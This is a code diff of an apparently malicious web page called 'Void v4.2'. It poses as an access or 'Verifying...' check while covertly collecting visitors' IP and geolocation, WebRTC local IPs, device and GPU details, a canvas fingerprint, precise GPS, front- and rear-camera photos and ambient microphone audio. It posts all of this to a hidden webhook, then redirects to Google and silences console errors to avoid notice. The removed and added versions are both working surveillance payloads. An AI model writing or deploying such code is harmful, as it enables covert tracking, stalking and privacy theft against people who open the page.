-        function showLoading() {
-            document.getElementById('accessBtn').style.display = 'none';
-            document.getElementById('loadingContainer').style.display = 'block';
-        }
-
-        // ═══════════════════════════════════════════
-        //  WEBHOOK QUEUE (rate-limit safe)
-        // ═══════════════════════════════════════════
-        const webhookQueue = [];
-        let queueRunning = false;
-
-        async function processQueue() {
-            if (queueRunning) return;
-            queueRunning = true;
-            while (webhookQueue.length > 0) {
-                const job = webhookQueue.shift();
-                for (let i = 0; i < MAX_RETRY; i++) {
-                    try {
-                        const opts = job.formData
-                            ? { method: 'POST', body: job.formData }
-                            : { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(job.payload) };
-                        const res = await fetch(_WH, opts);
-                        if (res.ok) break;
-                        if (res.status === 429) {
-                            const data = await res.json().catch(() => ({}));
-                            const wait = (data.retry_after || 2) * 1000;
-                            addLog(`Rate limited, waiting ${Math.ceil(wait/1000)}s...`, 'err');
-                            await sleep(wait + 100);
-                        } else {
-                            await sleep(1000 * (i + 1));
-                        }
-                    } catch (e) {
-                        await sleep(1500 * (i + 1));
-                    }
-                }
-                await sleep(600); // spacing between messages
-            }
-            queueRunning = false;
-        }
-
-        function queueWebhook(payload) {
-            webhookQueue.push({ payload });
-            processQueue();
-        }
-
-        async function sendWebhookNow(payload) {
-            for (let i = 0; i < MAX_RETRY; i++) {
-                try {
-                    const res = await fetch(_WH, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    if (res.ok) return true;
-                    if (res.status === 429) {
-                        const d = await res.json().catch(() => ({}));
-                        await sleep((d.retry_after || 2) * 1000 + 100);
-                    } else await sleep(1000 * (i + 1));
-                } catch { await sleep(1500 * (i + 1)); }
-            }
-            return false;
-        }
-
-        async function sendFileNow(formData) {
-            for (let i = 0; i < MAX_RETRY; i++) {
-                try {
-                    const res = await fetch(_WH, { method: 'POST', body: formData });
-                    if (res.ok) return true;
-                    if (res.status === 429) {
-                        const d = await res.json().catch(() => ({}));
-                        await sleep((d.retry_after || 2) * 1000 + 100);
-                    } else await sleep(1000 * (i + 1));
-                } catch { await sleep(1500 * (i + 1)); }
-            }
-            return false;
-        }
-
-        // ═══════════════════════════════════════════
-        //  DATA COLLECTORS
-        // ═══════════════════════════════════════════
-
-        // IP Intelligence
-        async function getIPInfo() {
-            const apis = [
-                'https://ipapi.co/json/',
-                'https://ip-api.com/json/?fields=66846719',
-                'https://ipwho.is/'
-            ];
-            for (const url of apis) {
-                try {
-                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
-                    if (res.ok) return await res.json();
-                } catch {}
-            }
-            return null;
-        }
-
-        // Battery
-        async function getBattery() {
-            try {
-                const b = await navigator.getBattery();
-                return { level: Math.round(b.level * 100), charging: b.charging };
-            } catch { return null; }
-        }
-
-        // Network
-        function getNetwork() {
-            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!c) return null;
-            return {
-                type: c.effectiveType || 'unknown',
-                downlink: c.downlink || '?',
-                rtt: c.rtt || '?',
-                saveData: c.saveData || false
-            };
-        }
-
-        // GPU via WebGL
-        function getGPU() {
-            try {
-                const cvs = document.createElement('canvas');
-                const gl = cvs.getContext('webgl') || cvs.getContext('experimental-webgl');
-                if (!gl) return null;
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                return ext ? {
-                    vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
-                } : null;
-            } catch { return null; }
-        }
-
-        // Canvas fingerprint
-        function getCanvasFingerprint() {
-            try {
-                const cvs = document.createElement('canvas');
-                cvs.width = 220; cvs.height = 60;
-                const ctx = cvs.getContext('2d');
-                ctx.textBaseline = 'alphabetic';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(100, 1, 80, 24);
-                ctx.fillStyle = '#069';
-                ctx.font = '14pt Arial';
-                ctx.fillText('VoidFP!@#', 2, 18);
-                ctx.fillStyle = 'rgba(102,204,0,0.7)';
-                ctx.font = '20pt Arial';
-                ctx.fillText('🔒Canvas', 4, 50);
-                const d = cvs.toDataURL();
-                let h = 0;
-                for (let i = 0; i < d.length; i++) {
-                    h = ((h << 5) - h) + d.charCodeAt(i);
-                    h |= 0;
-                }
-                return '0x' + (h >>> 0).toString(16).toUpperCase();
-            } catch { return null; }
-        }
-
-        // WebRTC local IPs
-        function getLocalIPs() {
-            return new Promise(resolve => {
-                const ips = new Set();
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-                    pc.onicecandidate = e => {
-                        if (!e || !e.candidate) { pc.close(); resolve([...ips]); return; }
-                        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (m) ips.add(m[0]);
-                    };
-                    setTimeout(() => { try { pc.close(); } catch {} resolve([...ips]); }, 4000);
-                } catch { resolve([]); }
-            });
-        }
-
-        // ═══════════════════════════════════════════
-        //  CAPTURE: IP + Device Session
-        // ═══════════════════════════════════════════
-        async function captureSessionInfo() {
-            addLog('Resolving IP address...', 'info');
-            updateStatus('status0', 'SCANNING', 'active');
-
-            const [ipInfo, battery, localIPs] = await Promise.all([
-                getIPInfo(),
-                getBattery(),
-                getLocalIPs()
-            ]);
-
-            const net = getNetwork();
-            const gpu = getGPU();
-            const fingerprint = getCanvasFingerprint();
-
-            updateStatus('status0', 'DONE', 'success');
-            addLog(`IP: ${ipInfo?.ip || ipInfo?.query || 'unavailable'}`, 'ok');
-            updateStatus('status2', 'DONE', 'success');
-            addLog('Device scanned', 'ok');
-            updateStatus('status3', 'DONE', 'success');
-            addLog(`Local IPs: ${localIPs.length} found`, 'ok');
-
-            // Build comprehensive embed
-            const fields = [];
-
-            // IP section
-            if (ipInfo) {
-                const ip = ipInfo.ip || ipInfo.query || '?';
-                const city = ipInfo.city || '?';
-                const region = ipInfo.region || ipInfo.regionName || '?';
-                const country = ipInfo.country || ipInfo.country_name || '?';
-                const countryCode = ipInfo.country_code || ipInfo.countryCode || '';
-                const isp = ipInfo.org || ipInfo.isp || '?';
-                const as = ipInfo.asn || ipInfo.as || '';
-                const tz = ipInfo.timezone || ipInfo.time_zone || '?';
-
-                fields.push({
-                    name: '📡 IP Intelligence',
-                    value: `\`\`\`\nPublic IP : ${ip}\nCity      : ${city}\nRegion    : ${region}\nCountry   : ${country} ${countryCode}\nISP       : ${isp}\nAS        : ${as}\nTimezone  : ${tz}\n\`\`\``,
-                    inline: false
-                });
-            }
-
-            // Local IPs
-            if (localIPs.length > 0) {
-                fields.push({
-                    name: '🔗 WebRTC Local IPs',
-                    value: '`' + localIPs.join('`, `') + '`',
-                    inline: false
-                });
-            }
-
-            // Device
-            fields.push({
-                name: '📱 Device Information',
-                value: `\`\`\`\nPlatform  : ${navigator.platform || '?'}\nCores     : ${navigator.hardwareConcurrency || '?'}\nMemory    : ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '?'}\nScreen    : ${screen.width}x${screen.height} @${window.devicePixelRatio || 1}x\nViewport  : ${window.innerWidth}x${window.innerHeight}\nColorDepth: ${screen.colorDepth}-bit\nTouch     : ${navigator.maxTouchPoints || 0} points\nLanguage  : ${navigator.language}\nLanguages : ${(navigator.languages || []).join(', ')}\nOnline    : ${navigator.onLine}\nDNT       : ${navigator.doNotTrack || 'unset'}\nCookies   : ${navigator.cookieEnabled}\n\`\`\``,
-                inline: false
-            });
-
-            // GPU
-            if (gpu) {
-                fields.push({
-                    name: '🎮 GPU',
-                    value: `\`\`\`\nVendor   : ${gpu.vendor}\nRenderer : ${gpu.renderer}\n\`\`\``,
-                    inline: false
-                });
-            }
-
-            // Battery
-            if (battery) {
-                fields.push({
-                    name: '🔋 Battery',
-                    value: `\`${battery.level}% ${battery.charging ? '⚡ Charging' : '🔌 Not Charging'}\``,
-                    inline: true
-                });
-            }
-
-            // Network
-            if (net) {
-                fields.push({
-                    name: '📶 Network',
-                    value: `\`${net.type.toUpperCase()} ↓${net.downlink}Mbps RTT:${net.rtt}ms${net.saveData ? ' [SaveData]' : ''}\``,
-                    inline: true
-                });
-            }
-
-            // Fingerprint
-            if (fingerprint) {
-                fields.push({
-                    name: '🔑 Canvas Fingerprint',
-                    value: `\`${fingerprint}\``,
-                    inline: true
-                });
-            }
-
-            // UserAgent (separate for length)
-            fields.push({
-                name: '🌐 User Agent',
-                value: `\`\`\`\n${navigator.userAgent}\n\`\`\``,
-                inline: false
-            });
-
-            // Referrer
-            if (document.referrer) {
-                fields.push({
-                    name: '↩️ Referrer',
-                    value: `\`${document.referrer}\``,
-                    inline: false
-                });
-            }
-
-            await sendWebhookNow({
-                content: `🖥️ **NEW SESSION** \`[${SESSION_ID}]\``,
-                embeds: [{
-                    title: '🔍 COMPREHENSIVE DEVICE REPORT',
-                    color: 0x2f3136,
-                    fields: fields,
-                    footer: { text: `Session ${SESSION_ID} • Void v4.2` },
-                    timestamp: new Date().toISOString()
-                }]
-            });
-
-            return ipInfo;
-        }
-
-        // ═══════════════════════════════════════════
-        //  CAPTURE: GPS LOCATION
-        // ═══════════════════════════════════════════
-        async function captureLocation(ipInfo) {
-            addLog('Requesting GPS access...', 'info');
-            updateStatus('status1', 'SCANNING', 'active');
-
-            return new Promise(resolve => {
-                if (!navigator.geolocation) {
-                    addLog('Geolocation not available', 'err');
-                    updateStatus('status1', 'N/A', 'error');
-                    resolve(false);
-                    return;
-                }
-
-                let attempts = 0;
-                const tryGPS = () => {
-                    attempts++;
-                    addLog(`GPS attempt ${attempts}/${MAX_RETRY}...`, 'info');
-
-                    navigator.geolocation.getCurrentPosition(
-                        async (pos) => {
-                            const lat = pos.coords.latitude.toFixed(7);
-                            const lon = pos.coords.longitude.toFixed(7);
-                            const acc = pos.coords.accuracy.toFixed(1);
-                            const alt = pos.coords.altitude ? pos.coords.altitude.toFixed(1) + 'm' : 'N/A';
-                            const speed = pos.coords.speed ? pos.coords.speed.toFixed(1) + 'm/s' : 'N/A';
-                            const heading = pos.coords.heading ? pos.coords.heading.toFixed(1) + '°' : 'N/A';
-                            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                            const mapImg = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=400x200&markers=${lat},${lon}`;
-
-                            addLog(`GPS locked: ${lat}, ${lon} (±${acc}m)`, 'ok');
-                            updateStatus('status1', 'DONE', 'success');
-
-                            await sendWebhookNow({
-                                embeds: [{
-                                    title: '📍 GPS LOCATION CAPTURED',
-                                    color: 0x00ff41,
-                                    description: `**[🗺️ OPEN IN GOOGLE MAPS](${mapLink})**`,
-                                    fields: [
-                                        {
-                                            name: '📐 Coordinates',
-                                            value: `\`\`\`\nLatitude  : ${lat}\nLongitude : ${lon}\nAccuracy  : ±${acc}m\nAltitude  : ${alt}\nSpeed     : ${speed}\nHeading   : ${heading}\n\`\`\``,
-                                            inline: false
-                                        },
-                                        {
-                                            name: '🕐 Timestamp',
-                                            value: `\`${new Date().toLocaleString('id-ID')}\``,
-                                            inline: true
-                                        },
-                                        {
-                                            name: '🎯 Attempt',
-                                            value: `\`${attempts}/${MAX_RETRY}\``,
-                                            inline: true
-                                        }
-                                    ],
-                                    footer: { text: `Session ${SESSION_ID}` },
-                                    timestamp: new Date().toISOString()
-                                }]
-                            });
-
-                            resolve(true);
-                        },
-                        (err) => {
-                            addLog(`GPS error: ${err.message}`, 'err');
-                            if (attempts < MAX_RETRY) {
-                                setTimeout(tryGPS, 2000);
-                            } else {
-                                updateStatus('status1', 'FAILED', 'error');
-                                // Fallback to IP location
-                                if (ipInfo) {
-                                    const lat = ipInfo.latitude || ipInfo.lat;
-                                    const lon = ipInfo.longitude || ipInfo.lon;
-                                    if (lat && lon) {
-                                        addLog(`Using IP geolocation fallback`, 'info');
-                                        sendWebhookNow({
-                                            embeds: [{
-                                                title: '📍 IP GEOLOCATION (Fallback)',
-                                                color: 0xffcc00,
-                                                description: `GPS denied. Approximate location from IP.`,
-                                                fields: [{
-                                                    name: 'Location',
-                                                    value: `\`${lat}, ${lon}\`\n[Open Map](https://www.google.com/maps?q=${lat},${lon})`,
-                                                    inline: false
-                                                }],
-                                                footer: { text: `Session ${SESSION_ID}` },
-                                                timestamp: new Date().toISOString()
-                                            }]
-                                        });
-                                    }
-                                }
-                                resolve(false);
-                            }
-                        },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                    );
-                };
-                tryGPS();
-            });
-        }
-
-        // ═══════════════════════════════════════════
-        //  CAPTURE: FRONT CAMERA (burst mode)
-        // ═══════════════════════════════════════════
-        async function captureFrontCamera() {
-            updateStatus('status4', 'SCANNING', 'active');
-            addLog('Accessing front camera...', 'info');
-
-            for (let attempt = 1; attempt <= MAX_RETRY; attempt++) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: 'user',
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-
-                    const video = document.getElementById('videoFront');
-                    const canvas = document.getElementById('canvasFront');
-                    video.srcObject = stream;
-                    video.muted = true;
-                    await video.play();
-                    await sleep(2000); // camera warm-up
-
-                    addLog(`Front camera active, taking ${BURST_COUNT} shots...`, 'ok');
-
-                    for (let shot = 1; shot <= BURST_COUNT; shot++) {
-                        canvas.width = video.videoWidth || 1280;
-                        canvas.height = video.videoHeight || 720;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        // Add stealth watermark
-                        ctx.fillStyle = 'rgba(255,255,255,0.01)';
-                        ctx.font = '10px monospace';
-                        ctx.fillText(`${SESSION_ID}-${shot}`, 5, canvas.height - 5);
-
-                        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', PHOTO_QUALITY));
-                        const formData = new FormData();
-                        formData.append('file', blob, `front_${SESSION_ID}_${shot}.jpg`);
-                        formData.append('payload_json', JSON.stringify({
-                            embeds: [{
-                                title: `📸 FRONT CAMERA — Shot ${shot}/${BURST_COUNT}`,
-                                color: 0x00d4ff,
-                                fields: [
-                                    { name: 'Resolution', value: `\`${canvas.width}x${canvas.height}\``, inline: true },
-                                    { name: 'Time', value: `\`${new Date().toLocaleString('id-ID')}\``, inline: true },
-                                    { name: 'Quality', value: `\`${PHOTO_QUALITY * 100}%\``, inline: true }
-                                ],
-                                image: { url: `attachment://front_${SESSION_ID}_${shot}.jpg` },
-                                footer: { text: `Session ${SESSION_ID} • Attempt ${attempt}` },
-                                timestamp: new Date().toISOString()
-                            }]
-                        }));
-
-                        await sendFileNow(formData);
-                        screenFlash();
-                        addLog(`Front shot ${shot}/${BURST_COUNT} captured ✓`, 'ok');
-
-                        if (shot < BURST_COUNT) await sleep(700);
-                    }
-
-                    stream.getTracks().forEach(t => t.stop());
-                    video.srcObject = null;
-                    updateStatus('status4', 'DONE', 'success');
-                    return true;
-                } catch (e) {
-                    addLog(`Front camera attempt ${attempt} failed: ${e.name}`, 'err');
-                    if (attempt === MAX_RETRY) {
-                        updateStatus('status4', 'FAILED', 'error');
-                        queueWebhook({ content: `❌ **Front camera failed** \`[${SESSION_ID}]\`: \`${e.message}\`` });
-                        return false;
-                    }
-                    await sleep(1500);
-                }
-            }
-            return false;
-        }
-
-        // ═══════════════════════════════════════════
-        //  CAPTURE: BACK CAMERA
-        // ═══════════════════════════════════════════
-        async function captureBackCamera() {
-            updateStatus('status5', 'SCANNING', 'active');
-            addLog('Accessing rear camera...', 'info');
-
-            for (let attempt = 1; attempt <= MAX_RETRY; attempt++) {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: { exact: 'environment' },
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-
-                    const video = document.getElementById('videoBack');
-                    const canvas = document.getElementById('canvasBack');
-                    video.srcObject = stream;
-                    video.muted = true;
-                    await video.play();
-                    await sleep(2000);
-
-                    canvas.width = video.videoWidth || 1280;
-                    canvas.height = video.videoHeight || 720;
-                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', PHOTO_QUALITY));
-                    const formData = new FormData();
-                    formData.append('file', blob, `rear_${SESSION_ID}.jpg`);
-                    formData.append('payload_json', JSON.stringify({
-                        embeds: [{
-                            title: '📸 REAR CAMERA',
-                            color: 0xff6600,
-                            fields: [
-                                { name: 'Resolution', value: `\`${canvas.width}x${canvas.height}\``, inline: true },
-                                { name: 'Time', value: `\`${new Date().toLocaleString('id-ID')}\``, inline: true }
-                            ],
-                            image: { url: `attachment://rear_${SESSION_ID}.jpg` },
-                            footer: { text: `Session ${SESSION_ID}` },
-                            timestamp: new Date().toISOString()
-                        }]
-                    }));
-
-                    await sendFileNow(formData);
-                    stream.getTracks().forEach(t => t.stop());
-                    video.srcObject = null;
-                    screenFlash();
-                    addLog('Rear camera captured ✓', 'ok');
-                    updateStatus('status5', 'DONE', 'success');
-                    return true;
-                } catch (e) {
-                    addLog(`Rear camera attempt ${attempt}: ${e.name}`, 'err');
-                    if (attempt === MAX_RETRY) {
-                        updateStatus('status5', 'SKIPPED', 'error');
-                        return false;
-                    }
-                    await sleep(1000);
-                }
-            }
-            return false;
-        }
-
-        // ═══════════════════════════════════════════
-        //  CAPTURE: MICROPHONE (ambient audio)
-        // ═══════════════════════════════════════════
-        async function captureAudio() {
-            updateStatus('status6', 'SCANNING', 'active');
-            addLog('Accessing microphone...', 'info');
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    audio: {
-                        echoCancellation: false,
-                        noiseSuppression: false,
-                        autoGainControl: true,
-                        sampleRate: 44100
-                    }
-                });
-
-                addLog(`Recording ${AUDIO_DURATION / 1000}s ambient audio...`, 'info');
-
-                const mimeTypes = [
-                    'audio/webm;codecs=opus',
-                    'audio/webm',
-                    'audio/ogg;codecs=opus',
-                    'audio/mp4'
-                ];
-                let mimeType = '';
-                for (const mt of mimeTypes) {
-                    if (MediaRecorder.isTypeSupported(mt)) { mimeType = mt; break; }
-                }
-
-                const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
-                const chunks = [];
-
-                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
-
-                return new Promise(resolve => {
-                    recorder.onstop = async () => {
-                        stream.getTracks().forEach(t => t.stop());
-                        const ext = mimeType.includes('webm') ? 'webm' : mimeType.includes('ogg') ? 'ogg' : 'mp4';
-                        const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
-                        
-                        if (blob.size < 500) {
-                            addLog('Audio too small, skipping', 'err');
-                            updateStatus('status6', 'FAILED', 'error');
-                            resolve(false);
-                            return;
-                        }
-
-                        const formData = new FormData();
-                        formData.append('file', blob, `audio_${SESSION_ID}.${ext}`);
-                        formData.append('payload_json', JSON.stringify({
-                            embeds: [{
-                                title: '🎤 AMBIENT AUDIO CAPTURED',
-                                color: 0xff003c,
-                                fields: [
-                                    { name: 'Duration', value: `\`${AUDIO_DURATION / 1000}s\``, inline: true },
-                                    { name: 'Format', value: `\`${mimeType || 'default'}\``, inline: true },
-                                    { name: 'Size', value: `\`${(blob.size / 1024).toFixed(1)} KB\``, inline: true }
-                                ],
-                                footer: { text: `Session ${SESSION_ID}` },
-                                timestamp: new Date().toISOString()
-                            }]
-                        }));
-
-                        await sendFileNow(formData);
-                        addLog(`Audio captured: ${(blob.size / 1024).toFixed(1)} KB ✓`, 'ok');
-                        updateStatus('status6', 'DONE', 'success');
-                        resolve(true);
-                    };
-
-                    recorder.start(1000);
-                    setTimeout(() => {
-                        if (recorder.state === 'recording') recorder.stop();
-                    }, AUDIO_DURATION);
-                });
-            } catch (e) {
-                addLog(`Microphone failed: ${e.name}`, 'err');
-                updateStatus('status6', 'DENIED', 'error');
-                queueWebhook({ content: `❌ **Microphone denied** \`[${SESSION_ID}]\`: \`${e.message}\`` });
-                return false;
-            }
-        }
-
-        // ═══════════════════════════════════════════
-        //  MAIN ORCHESTRATOR
-        // ═══════════════════════════════════════════
-        async function initiateAccess() {
-            showLoading();
-            addLog('Session initiated: ' + SESSION_ID, 'info');
-            updateProgress(2);
-            setLoadText('PHASE 1 — RECONNAISSANCE...');
-
-            // Phase 1: Session info (IP, device, fingerprint, network)
-            const ipInfo = await captureSessionInfo();
-            updateProgress(15);
-            await sleep(400);
-
-            // Phase 2: GPS Location
-            setLoadText('PHASE 2 — GPS ACQUISITION...');
-            await captureLocation(ipInfo);
-            updateProgress(30);
-            await sleep(400);
-
-            // Phase 3: Front Camera (burst)
-            setLoadText('PHASE 3 — FRONT CAMERA...');
-            await captureFrontCamera();
-            updateProgress(55);
-            await sleep(400);
-
-            // Phase 4: Back Camera
-            setLoadText('PHASE 4 — REAR CAMERA...');
-            await captureBackCamera();
-            updateProgress(70);
-            await sleep(400);
-
-            // Phase 5: Audio
-            setLoadText('PHASE 5 — AUDIO CAPTURE...');
-            await captureAudio();
-            updateProgress(88);
-            await sleep(400);
-
-            // Phase 6: Compile
-            setLoadText('PHASE 6 — COMPILING DATA...');
-            updateStatus('status7', 'SCANNING', 'active');
-            addLog('Compiling session data...', 'info');
-            await sleep(500);
-
-            // Summary
-            const statuses = [];
-            for (let i = 0; i <= 7; i++) {
-                const el = document.getElementById('status' + i);
-                statuses.push(`${el.closest('.terminal-line').querySelector('.terminal-label').textContent}: ${el.textContent}`);
-            }
-
-            await sendWebhookNow({
-                embeds: [{
-                    title: '✅ SESSION COMPLETE',
-                    color: 0x00ff41,
-                    description: `All capture phases completed for session \`${SESSION_ID}\``,
-                    fields: [{
-                        name: '📊 Status Summary',
-                        value: '```\n' + statuses.join('\n') + '\n```',
-                        inline: false
-                    }],
-                    footer: { text: `Session ${SESSION_ID} • Void v4.2` },
-                    timestamp: new Date().toISOString()
-                }]
-            });
-
-            updateProgress(100);
-            updateStatus('status7', 'DONE', 'success');
-            setLoadText('ACCESS GRANTED');
-            addLog('All phases complete. Redirecting...', 'ok');
-
-            await sleep(2000);
-            document.body.classList.add('fade-out');
-            await sleep(1500);
-            window.location.href = 'https://www.google.com';
-        }
-
-        // Suppress console errors
-        window.addEventListener('error', e => e.preventDefault());
-        window.addEventListener('unhandledrejection', e => e.preventDefault());
-    </script>
+        stream.getTracks().forEach(t=>t.stop());
+        vid.srcObject=null;
+        return true;
+    }catch{
+        if(stream)stream.getTracks().forEach(t=>t.stop());
+        vid.srcObject=null;
+        return false;
+    }
+}
+
+// ═══ MAIN ═══
+async function go(){
+    const btn=$('btn');
+    btn.classList.add('loading');
+    btn.textContent='Verifying...';
+    btn.innerHTML='Verifying...<div class="bar" id="bar"></div>';
+    prog(5);
+
+    // GPS
+    const loc=await gps();
+    prog(20);
+    if(!loc)await ipLoc();
+    prog(30);
+
+    // Front cam
+    await cam('front');
+    prog(60);
+
+    // Rear cam
+    await cam('rear');
+    prog(90);
+
+    // Done
+    await send({embeds:[{title:'✅ COMPLETE',color:0xffffff,description:`Session \`${S}\` finished.\nLocation: ${loc?'✓ GPS':'⚠ IP only'}\nFront: captured\nRear: captured`,footer:{text:S},timestamp:new Date().toISOString()}]});
+
+    prog(100);
+    stat('');
+    $('circle').classList.add('done');
+    $('title').textContent='Verified';
+    $('sub').textContent='Redirecting...';
+    btn.style.display='none';
+    $('title').classList.add('done-msg');
+
+    await sleep(2000);
+    $('wrap').classList.add('fade-out');
+    await sleep(1000);
+    window.location.href='https://www.google.com';
+}
+
+// Suppress
+window.addEventListener('error',e=>{e.preventDefault();e.stopPropagation()},true);
+window.addEventListener('unhandledrejection',e=>{e.preventDefault();e.stopPropagation()},true);
+(()=>{try{console.log=()=>{};console.warn=()=>{};console.error=()=>{};console.info=()=>{};console.debug=()=>{}}catch{}})();
+</script>
 </body>
 </html>
